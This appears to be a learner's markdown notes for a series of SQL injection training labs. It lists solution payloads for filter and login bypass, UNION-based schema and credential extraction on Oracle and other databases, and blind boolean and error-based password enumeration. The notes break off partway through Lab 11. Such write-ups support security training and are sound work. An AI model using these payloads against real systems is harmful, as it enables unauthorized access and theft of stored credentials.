# SQLi

## LAB 1 -- Retrieving hidden data

find vulnerable part by adding **_'_** which will accure error in the server
example: SELECT _ FROM product where category = '$cat_name'
error: SELECT _ FROM product where category = 'pets''
to avoid the error you need to comment all the next words by adding -- in oracle and # in microsoft
**SOLUTION :** '+or+1=1

---

## LAB 2 -- Subverting application logic

after finding vuln part we can use it for multiple reasons like bypassing login
this is the authentication logic: SELECT \* FROM users WHERE username = '$user' AND password = '$pass'

after setting $user = administrator'--
will select only administrator username and comment the next logic
**SOLUTION:** administrator'--

---

## LAB 3 -- Determining the number of columns required in a SQL injection UNION attack

with UNION you get data from other tables and display it

1. so first let's start with ' order by num -- with this payload you can check how many columns are there by inserting number from 1 until the error accured (**The ORDER BY position number 3 is out of range of the number of items in the select list.**)
2. or you can use 'union select null,null... until you found the right number of columns which the data will be displayed wothout any errors
   **SOLUTION:** '+UNION+SELECT+NULL,NULL--

---

## LAB 4 -- Finding columns with a useful data type in a SQL injection UNION attack

then you need to know the type of the column int or str by replacing null with random values like this :
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
**SOLUTION:** '+UNION+SELECT+null,'qJRR0O',NULL--

---

## LAB 5 -- Using a SQL injection UNION attack to retrieve interesting data

in this lab will you need to use union attack to retrieve the username and the password
after finding how many columns are available and there types you can use the str columns to get username and password
**SOLUTION:** '+UNION+SELECT+username,+password+FROM+users--

---

## LAB 6 -- Retrieving multiple values within a single column

in this lab you will find just one str column but you need to get the username & pass
you retrieve them in single column using the following payload
**SOLUTION:** ' UNION SELECT username || '~' || password FROM users--

---

## LAB 7 -- Querying the database type and version

**ORACLE SOLUTION:** '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
**MICROSOFT SOLUTION:** '+UNION+SELECT+@@version,+NULL#

---

## LAB 8 -- Listing the contents of the database

now we need to get all content of the database notice that we will use **information_schema.tables** to get all tables and **information_scheme.columns** to get the columns of the tbales

**SOLUTION:**

1. you need to get all tables using this payload **'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--**

2. you need to get all the columns of the table with this payload:
   **'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--**
3. get the username and the pass of the admin with the following payload: **'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--**

---

## LAB 9 -- SQL injection attack, listing the database contents on Oracle

**SOLUTION:**

1. you need to get all tables using this payload **'+UNION+SELECT+table_name,+NULL+FROM+all_tables--**

2. you need to get all the columns of the table with this payload:
   **'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='users_abcdef'--**
3. get the username and the pass of the admin with the following payload: **'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--**

---

## LAB 10 -- Exploiting blind SQL injection by triggering conditional responses:

1. check if username administrator exist:
   trackingID' and (select username from users where username = 'administrator') = 'administrator' --
   "welcome back!" returned, username exist

2. enumerate the length of the password:
   send the request to the repeater and try:

   - trackingID' and (select username from users where username = 'administrator' and LENGTH(password)> 1) = 'administrator'-- ===> welcome back returned so the length of the password is > 1 ofc
   - trackingID' and (select username from users where username = 'administrator' and LENGTH(password)> 30) = 'administrator'-- ===> welcome back not returned so the length of the password is less then 30

   after send the request to the intreducer and add the params start the and find the right length

3. enumerate the password using cluster bomb attack:
   after sending the request to the intruder and use brut forcer:
   ' and (select substring(password,$1$,1) from users where username = 'administrator') = '$a$' --

---

## LAB 11 -- Blind SQL injection with conditional errors:

1. first let's inject sql code that cause an error and see if the website is vulnerable using this code:
   trackingID' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
   noticed that you will recieve internal error

2. let's check if 'administrator' user is there:
   '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
   if the user exist the condition will be executed otherwise it'll not

3. password length enumuration:
   '||(SELECT CASE WHEN LENGTH(password)=$1$ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
   when the right length found an error will accured

4. password enumuration:

---

## LAB 12 --
